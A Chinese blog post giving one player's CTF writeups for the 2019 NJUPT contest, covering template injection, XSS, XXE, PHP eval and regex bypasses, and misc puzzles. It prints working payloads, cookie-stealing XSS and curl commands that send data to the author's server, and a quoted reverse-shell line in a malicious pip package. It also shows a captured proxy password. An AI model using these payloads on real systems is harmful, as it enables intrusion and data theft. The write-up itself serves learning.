---
title: NJUPT CTF writeup
categories:
  - 比赛Writeup
tags:
  - ctf
  - Writeup
index_img: /img/used/comp.jpg
date: 2019-11-23 21:32:33

---

# NJUPT CTF writeup

## 学到的新知识、需要巩固的技术

+ XSS的简单利用

+ XXE的简单应用和内网嗅探特性

+ curl方法外带不回显得系统命令，create_function()，php灵活的函数调用

+ preg_replace()的漏洞，waf的一些绕过技巧

+ pip包的安装过程

## WEB

### Flask

基本算是模板的模板注入题。  

用基础操作找到可以调用os模块的类：  

```
{{"".__class__.__mro__[2].__subclasses__()[68].__init__.__globals__[&#39;os&#39;]}}
```

  发现system函数仅仅给出返回值的回显，可考虑把结果curl发送到vps上，或者结果输出到其他文件上。但其实不用这么麻烦。  

找到file类：  

```
{{"".__class__.__mro__[2].__subclasses__()[40]("../").read()}}
```

发现上层目录存在flag。  

```
{{"".__class__.__mro__[2].__subclasses__()[40]("fl"+"ag").read()}}os的read方法读取flag，发现被过滤。尝试url直接输入flag，也被过滤，说明这是针对url的过滤。直接在python语法中绕过即可。
```

最终payload：

```
{{"".__class__.__mro__[2].__subclasses__()[40]("../fl"+"ag").read()}}
```

`NCTF{Y0u_can_n0t_Read_flag_directly}`

### simple_XSS [Unsolved]

#### 尝试1

想要尝试向自己的服务器发admin的cookie：

有好多种xss的方法。一种是直接使用js

```javascript
<script>window.location.href="http://45.32.9.0/?cookie="+encodeURI(document.cookie);</script>
```

但几次实验后，发现对js的长度是有限制的。  

（以为是对js的一些函数进行了过滤，但实际上并没有）  

之后尝试加载远程js的方式：在自己的服务器上放了个xss.js，代码如下：  

```javascript
root@vultr:~# cat /var/www/html/xss.js

window.location.href="http://45.32.9.0?cook="+escape(document.cookie);
```

(经过试验，encodeURI这个方法并不能完整地传回cookie，还是使用escape方法)之前使用了GET方法向服务器传了很多cookie参数，所有这次用cook参数  

给题目中自己创建的用户发送xss消息如下

```html
<script src=http://45.32.9.0/xss.js></script>
```

查看服务器端的访问日志`/var/log/apache2/access.log`发现成功进行了跳转和接收cookie。（cook后面的内容就是sessionID）  

```bash
root@vultr:~# cat /var/log/apache2/access.log | grep cook=

59.64.129.66 - - [23/Nov/2019:18:33:06 +0000] "GET /?cook=PHPSESSID%3Dd1a1febd6814437dbad2a31e7694f8e7%3B%20user%3D34907cfa1ba4fba6e777c6b7e2806f49 HTTP/1.1" 200 812 "http://nctf2019.x1ct34m.com:40001/home.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0"
```

但是用这个方法给admin传xss，并没有收到admin的cookie...  

#### 尝试2

刚才的思路专业一点，就成为了XSS平台。这个平台可以加载各种各样的xss，并在平台上接收不小心点击XSS的人的信息，只要你在具有XSS漏洞的网站上复制了特定的代码。

[XSS平台-安全测试](http://xsspt.com/index.php)  

[另一个平台](https://xsshs.cn/xss.php)

`NCTF{Th1s_is_a_Simple_xss}`

### Fake XML Cookbook

很简单的题目，但之前没学过xxe，趁这个机会学习一次。  

直接改POST即可。注入一个恶意的外部实体，使用file协议，根据题目提示读取flag。  

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///flag">
 ]>

<user><username>&xxe;</username><password>asd</password></user>
```

`NCTF{W3lc0m3_T0_NCTF_9102}`

### TRUE XML cookbook

好像脑洞一样的题目。。依然是利用xxe。  

正解是去内网探测，但是为什么这样做呢？猜测是在不知道做什么的情况下，多收集主机信息，读取host，passwd等等各种文件，或者看一些log。  

读取`/etc/hosts`与`/proc/net/arp`推得内网存活主机ip为`192.168.1.8`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "http://192.168.1.8">
 ]>

<user><username>&xxe;</username><password>asd</password></user>
```

`NCTF{XXE-labs_is_g00d}`

### Hacker_BackDoor

首先审计代码，这里只显示关键代码

```php
<?php

$code = $_GET['code'];
$usrful = $_GET['useful'];

function waf($a){
    $dangerous = get_defined_functions();
    array_push($dangerous["internal"], 'eval', 'assert');
    foreach ($dangerous["internal"] as $bad) {
        if(strpos($a,$bad) !== FALSE){
        return False;
        break;
        }
    }
    return True;
}

if(file_exists($usrful)){
    if(waf($code)){
        eval($code);
    }
    else{
        die("oh,不能输入这些函数哦 :) ");
    }
} 
```

get_defined_functions()函数包含了所有预定义的函数，除了echo。  

绕过的基本思路是通过$"函数名称"(<参数>,...)的方法来调用  

这里不能用system函数，需要用proc_open()方法  

通过curl外带回显结果的方法：

```bash
curl "http://yourhost/?flag=`/readflag`"
```

这里 /readflag 是渗透后常用的读flag的方法。  

反引号用来把一个命令的执行结果作为字符串。

然后在你的服务器的apache之access.log中就可以找到访问的记录。  

```
root@vultr:/var/log/apache2# cat access.log | grep flag
47.104.67.14 - - [23/Nov/2019:12:44:08 +0000] "GET /?flag=NCTFu_arrree_S0_c3refu1_aaaaaaa HTTP/1.1" 200 1153 "-" "curl/7.52.1"
root@vultr:/var/log/apache2# 
```

`NCTF{u_arrree_S0_c3refu1_aaaaaaa}`

### Upload [Unsolved]

找到了上传点，并且发现过滤方式为：后端的MIME TYPE检测+文件名白名单检测+文件幻数检测。  

上传之后访问不到文件，也不知道文件会不会被访问。。不知道怎么办了

### Replace

首先经过了很多尝试，发现使用的是preg_match()函数。  

又尝试了很多字串，发现第三个参数不安全。  

具体原理还不太清楚，需要进一步研究

Payload:

```http
POST /index.php HTTP/1.1
Host: nctf2019.x1ct34m.com:40006
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Origin: http://nctf2019.x1ct34m.com:40006
Connection: close
Referer: http://nctf2019.x1ct34m.com:40006/index.php
Cookie: PHPSESSID=vkr2rl8eptbuvuhklr21d7ot7v
Upgrade-Insecure-Requests: 1

sub=system&pat=&rep=$_POST[sub]($_POST[shell])&shell=cat /flag
```

shell变量可以执行任意命令。

`NCTF{getshe11_has_different_methods}`

### Flask Website [Unsolved]

只有一个输入网址的框，感觉像是SSRF，但构造了下文件协议`file:///etc/passwd`也可以读取。猜测会使用gopher协议？  

点击下面的链接，发现报错信息。

```python
File "/app/QWQ.py", line 24, in contact

       except:
                return '发生错误了QWQ'
@app.route('/contact')

def contact():
        return render_template('contact.html')

if __name__ == '__main__':
  app.run(host="0.0.0.0", port=9999, debug=True)
```

正好利用刚才的文件协议读取py文件：`file:///app/QWQ.py`，得到结果:

```python
from flask import *
import urllib 
app = Flask(__name__) 

def req_url(uri): 
    with urllib.request.urlopen(uri) as res:
        return res.read() 

@app.route('/') 
def index(): 
    return render_template('index.html') 

@app.route('/get_content', methods=['POST']) 
def get_content(): 
    request_url = request.form['url'] 
    try: 
        return req_url(request_url) 
    except: 
        return '发生错误了QWQ' 

@app.route('/contact') 
def contact(): 
    return render_template('contact.html') 

if __name__ == '__main__': 
    app.run(host="0.0.0.0", port=9999, debug=True) 
```

看到文件渲染了index.html，contact.html这两个文件。根据Flask的编程经验，模板一般会放在`templates`文件夹中单独管理。所以使用file协议分别读取源代码：

`file:///app/templates/index.html`  

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>(ฅ>ω<*ฅ)</title>
</head>
<body>
<center>
<h3>这里可以显示你想要的内容 :)</h3>
<img src="{{ url_for('static',filename='images/1.gif') }}" alt="">
<form action="/get_content" method="post" >
        <p>请输入网址<input name="url"></p>
        <p><button type="submit"> 提交</button></p>
</form>
<div><br><br><br><br><br><br><br><br><br><br><br><br><br></div>
<footer>
<p>Contact information: <a href="{{url_for('contact')}}">admin@x1c.com</a>.</p>
</footer>
</center>
</body>
</html>
```

`file:///app/templates/contact.html`  读取不到

### easyphp [第二个不懂]

第一个bypass

```php
if($_GET['num'] !== '23333' && preg_match('/^23333$/', $_GET['num'])){
    echo '1st ok'."<br>";
}
else{
    die('23333333');
}
```

payload: `num=23333%0a`，这个在网上找了很久。。原理暂且未知，应该学习尝试下fuzz。  

第二个bypass

```php
//2nd
if(is_numeric($string_1)){
    $md5_1 = md5($string_1);
    $md5_2 = md5($string_2);
    if($md5_1 != $md5_2){
        $a = strtr($md5_1, 'cxhp', '0123');
        $b = strtr($md5_2, 'cxhp', '0123');
        if($a == $b){
            echo '2nd ok'."<br>";
        }
        else{
            die("can u give me the right str???");
        }
    } 
    else{
        die("no!!!!!!!!");
    }
}
else{
    die('is str1 numeric??????');
} 
```

strtr函数后面的字符串，可以对应地去替换。也就是说，c替换为0，x替换为1，...

str1=2120624&str2=240610708&q%20w%20q=c\at%20*

md51 = 0e85776838554cc1775842c212686416  

md52 = 0e462097431906509019562988736854

这里用到的知识为：php弱类型判断时，MD5以0e开头，并且后面全部都是0-9的数字，才可以相等。如果有字母是不可以的！

第三个

```php
//3rd
$query = $_SERVER['QUERY_STRING'];
if (strlen($cmd) > 8){
    die("too long :(");
}

if( substr_count($query, '_') === 0 && substr_count($query, '%5f') === 0 ){
    $arr = explode(' ', $cmd);
    if($arr[0] !== 'ls' || $arr[0] !== 'pwd'){
        if(substr_count($cmd, 'cat') === 0){
            system($cmd);
        }
        else{
            die('ban cat :) ');
        }
    }
    else{
        die('bad guy!');
    }
}
else{
    die('nonono _ is bad');
} 
```

php会把空格或者点（.）自动替换成下划线，可以用来绕过。  

cat命令，直接`cat *`可以打印当前目录下全部文件。  

`http://nctf2019.x1ct34m.com:60005/?num=23333%0a&str1=2120624&str2=240610708&q.w.q=c\at *`

得到flag`NCTF{t3is_So_siiimpppllleeee_to_u}`

## Misc

### pip install

从官网上下载完整的包文件来查看。  

审计到setup.py时，发现了这样的代码：  

```python
tmp_file = tempfile.gettempdir() + path.sep + '.f14g_is_here'
f = open(tmp_file, 'w')
f.write('TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9')
f.close()

# system('bash -i >& /dev/tcp/1.1.1.1/7777 0>&1')
# Ohhhh, that a joke. I won't do that. 

setup(...
```

然后解密base64就可以得到flag。  

`NCTF{c4reful_ab0u7_ev1l_pip_p4ckage}`  

这道题也给我们提了个醒，要小心来源不明的pip包，不要直接就sudo pip install...

### a_good_idea

得到图片，首先看表层信息。getinfo没有发现信息。  

检查隐写：`binwalk pic`发现压缩包，`foremost pic`提取。

解压压缩包，发现其中有一个hint.txt:

> try to find the secret of pixels

和两张看似一样的图片。  

图片像素XOR，得到新图片，其中有明暗相间的红色格子。调高亮度，感觉像是二维码。用二值化的思想，直接使用PS的魔棒工具，阈值选择5，抠图即可得到二维码。

![solve2.png](https://upload-images.jianshu.io/upload_images/19782504-7d922d436e4da13f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

`NCTF{m1sc_1s_very_funny!!!}`

### become a Rockstar

看起来很像是一门语言。百度rockstar语言，还真的有。。

直接转码python

```python
leonard_adleman = "star"
problem_makers = 76
problem_makers = "NCTF{"
def God(World):
    a_boy = "flag"
    the_boy = 3
def Evil(your_mind):
    a_girl = "no flag"
    the_girl = 5
Truths = 3694
Bob = "ar"
adi_shamir = "rock"
def Love(Alice, Bob):
    Mallory = 13
    Mallory = 24
Everything = 114514
Alice = "you"
def Reality(God, Evil):
    God = 26
    Evil = 235
ron_rivest = "nice"
def you_want_to(Alice, Love, Anything):
    You = 5.75428
your_heart = input()
You = 5
your_mind = input()
Nothing = 31
if Truths * Nothing == Everything:
    RSA = ron_rivest + adi_shamir + leonard_adleman
if Everything / Nothing == Truths:
    problem_makers = problem_makers + Alice + Bob
print(problem_makers,end="")
the_flag = 245
the_confusion = 244
print(RSA,end="")
mysterious_one = "}"
print(mysterious_one,end="")
```

`NCTF{youarnicerockstar}`

### 有内鬼，停止交易

按照题目提示寻找config.json，发现是一个ss的配置

```
GET /config.json HTTP/1.1
Host: 123.207.121.32
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

HTTP/1.1 200 OK
Date: Thu, 14 Nov 2019 17:25:04 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Thu, 14 Nov 2019 17:23:53 GMT
ETag: "d5-59751bed18f7e"
Accept-Ranges: bytes
Content-Length: 213
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{
    "server":"123.207.121.32",
    "server_port":25565,
    "local_port":1080,
    "password":"5e77b05530b30283e24c120d8cc13fb5",
    "timeout":600,
    "method":"aes-256-cfb",
    "local_address":"127.0.0.1"
}
```
